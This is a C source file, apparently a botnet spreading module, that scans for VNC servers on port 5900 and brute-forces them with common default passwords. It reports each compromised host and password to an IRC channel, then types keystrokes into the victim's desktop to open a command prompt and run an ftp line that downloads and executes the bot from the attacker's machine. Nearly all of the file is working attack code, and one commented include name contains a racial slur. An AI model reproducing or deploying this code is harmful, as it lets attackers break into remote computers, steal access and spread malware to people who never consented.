/*
 *      vncexploit.c 2007 Ravo_5002
 *      This code is for educational purposes only...
 *		Took some code from dej and from tightvnc :)
 */

//#include <stdio.h>
//#include <winsock.h>
//#include <windows.h>

//#include "vncexploit.h"
//#include "niggerbot.h"
//#include "config.h"
//#include "d3des.h"
#include "..\Inc.h"
#include "..\Fun.h"
#include "..\Ext.h"

void SendKey(SOCKET sock, char bkey, char key, int state) 
{ 
   char sendkey[8]; 

   // compose packet 
   memset(sendkey, '\x04', 1); 

   if (state == 0 || state == 1) 
      memset(sendkey + 1, state, 1); 
   else 
      memset(sendkey + 1, 1, 1); 

   memset(sendkey + 2, 0, 4); 
   memset(sendkey + 6, bkey, 1); 
   memset(sendkey + 7, key, 1); 

   send(sock, sendkey, sizeof(sendkey), 0); 

   if (state > 1) 
   { 
      memset(sendkey + 1, 0, 1); 
      send(sock, sendkey, sizeof(sendkey), 0); 
   } 
} 

void VNCRoot(SOCKET sVNC, char *tftp) { 
   char text_cmd[] = "command"; 
   char text_exit[] = "exit";
   char bkey = '\xff', 
       keyctrl = '\xe3', 

keyup = '\x52', 
       keyenter = '\x0d',
	   keyesc = '\x1b';
   unsigned int i; 

   Sleep(2000); 

   //Press ENTER (in case of screensaver) 
   SendKey(sVNC, bkey, keyenter, 2); 
   Sleep(500); 

   Sleep(2000); 
SendKey(sVNC, bkey, keyctrl, 1);
SendKey(sVNC, bkey, keyesc, 1);
Sleep(100);
SendKey(sVNC, bkey, keyctrl, 0);
SendKey(sVNC, bkey, keyesc, 0);
   //If its Windows2k 
   
   for (i = 0; i < 3; i++) 
   { 
      SendKey(sVNC, bkey, keyup, 2); 
      Sleep(500); 
   } 

   //Press ENTER 
   SendKey(sVNC, bkey, keyenter, 2); 
   Sleep(2000); 

   //type in "cmd" 
   for (i = 0; i < strlen(text_cmd); i++) 
   { 
      SendKey(sVNC, 0, text_cmd[i], 2); 
      Sleep(125); 
   } 

   //press ENTER 
   SendKey(sVNC, bkey, keyenter, 2); 
   Sleep(2000); 

   //send tftp line 
   for (i = 0; i < strlen(tftp); i++) 
   { 
      SendKey(sVNC, 0, tftp[i], 2); 
      Sleep(125); 
   } 
    
   //press ENTER 
   SendKey(sVNC, bkey, keyenter, 2); 
   Sleep(2000); 
    
   SendKey(sVNC, bkey, keyenter, 2); 
   //type in "cmd" 
   for (i = 0; i < strlen(text_exit); i++) 
   { 
      SendKey(sVNC, 0, text_exit[i], 2); 
      Sleep(125); 
   } 
      //press ENTER 
   SendKey(sVNC, bkey, keyenter, 2); 
   Sleep(2000);  
}

int ReadExact(SOCKET r_sock, char *inbuf, int wanted) { 

   int offset = 0; 
    
   while (wanted > 0) { 
      int bytes = recv(r_sock, inbuf+offset, wanted, 0); 
      if ((bytes == 0) || (bytes == SOCKET_ERROR)) return 0; 
      wanted -= bytes; 
      offset += bytes; 
   } 

   return 1; 
} 

int WriteExact(SOCKET w_sock, char *buf, int bytes) { 

   if (bytes == 0) return FALSE; 

   int i = 0; 
    int j; 

    while (i < bytes) { 
      j = send(w_sock, buf+i, bytes-i, 0); 
      if (j == SOCKET_ERROR || j==0) return 0; 
      i += j; 
    } 

   return 1; 
}

void vncEncryptBytes(unsigned char *bytes, char *passwd) {
    unsigned char key[8];
    unsigned int i;

    /* key is simply password padded with nulls */

    for (i = 0; i < 8; i++) {
	if (i < strlen(passwd)) {
	    key[i] = passwd[i];
	} else {
	    key[i] = 0;
	}
    }

    deskey(key, EN0);

    for (i = 0; i < 16; i += 8) {
		des(bytes+i, bytes+i);
    }
}

int vnccheck(char *host, char *passwd, SOCKET ircconn) {

	SOCKET sock;
	SOCKADDR_IN ssin;
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons(5900);
	ssin.sin_addr.s_addr= inet_addr(host);
	
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(connect(sock, (LPSOCKADDR)&ssin, sizeof(ssin))) {
		//printf("[-] Could not connect\n");
		return 1;
	}
	
	char buff[4096];
	
	//char ftpline[256];
	char tftpline[256];
	//sprintf(ftpline, "echo open %s %d > ravo &echo user %s %s >> ravo &echo get %s >> ravo &echo bye >> ravo &ftp -n -v -s:ravo &del ravo &%s\r\n", getlocalip(), FTPPORT, "Ravo", "5002", BOTNAME, BOTNAME);
	sprintf(tftpline, "echo open %s %d > ravo &echo user %s %s >> ravo &echo get %s >> ravo &echo bye >> tftpuser &ftp -n -v -s:tftpuser &del tftpuser &%s\r\n", (exinfo.ip), FTPPORT, "tftpuser", "5002", filename, filename);

	unsigned char vncversion[12];
	ReadExact(sock, vncversion, sizeof(vncversion));
	if(strstr(vncversion, "RFB")) {
		WriteExact(sock, vncversion, sizeof(vncversion));
		strtok(vncversion, " ");
		int versa = atoi(strtok(NULL, "."));
		int versb = atoi(strtok(NULL, "\n"));
		//printf("[+] Found VNC %d.%d\n", versa, versb);

		char auth[4];
		ReadExact(sock, auth, 4);

		if(auth[1] == 1 || auth[3] == 1) {
			//printf("[+] VNC NoAuth!\n");
			sprintf(buff, "PRIVMSG %s :VNC v%d.%d with no pass on host %s\n", CHANNEL, versa, versb, host);
			send(ircconn,buff, strlen(buff), 0);
			WriteExact(sock, "\0", 1);
			//VNCRoot(sock, ftpline);
			VNCRoot(sock, tftpline);
			closesocket(sock);
			return 1;
		}
		else if(auth[1] == 2 || auth[3] == 2) {
			//printf("[+] VNC needs pass lets brewtf0rc3\n");
			char funk[1];
			//funk = "0\n";
			funk[0] = auth[1];
			//funk[1] = '\n';
			//printf("funk:\n%s\n%d %d\n", funk, funk[0], funk[1]);
			
			WriteExact(sock, funk, 1);  // WTF? I NEED 2 send sumthing or ill not get the challenge
			unsigned char challenge[16];
			ReadExact(sock, challenge, 16);


			vncEncryptBytes(challenge, passwd);
			
			WriteExact(sock, challenge, 16); // send encrypted shit
			
			// see wtf the status is
			unsigned char status[4];
			ReadExact(sock, status, 4);
			if(status[3] == 0) {
				//printf("[+] pass ok\n");
				sprintf(buff, "PRIVMSG %s :[VNC] v%d.%d with pass %s on ip %s\n", CHANNEL, versa, versb, passwd, host);
				send(ircconn,buff, strlen(buff), 0);
				WriteExact(sock, "\0", 1);
				//VNCRoot(sock, ftpline);
				VNCRoot(sock, tftpline);
				closesocket(sock);
				return 1;
			}
			else if(status[3] == 1) {
				//printf("[-] pass wrong\n");
				return 0;
			}
			else if(status[3] == 1) {
				//printf("[-] 2much connections\n");
				return 2;
			}
		}
		else if(auth[1] ==0) {
			return 1;
		}
	}
	closesocket(sock);
	return 0;
}

void vncscan(SOCKET ircconn, char *ip) { 
	char *passes[] = { "1234", "password", "12345678", "qwerty", "123", "vnc", "login", NULL };
	int i = 0;
	int status;
	while(passes[i] != NULL) {
		status = vnccheck(ip, passes[i], ircconn);
		if(status == 1) break;
		if(status == 2) Sleep(20000);
		i++;
		Sleep(500);
	}
	return;
} 

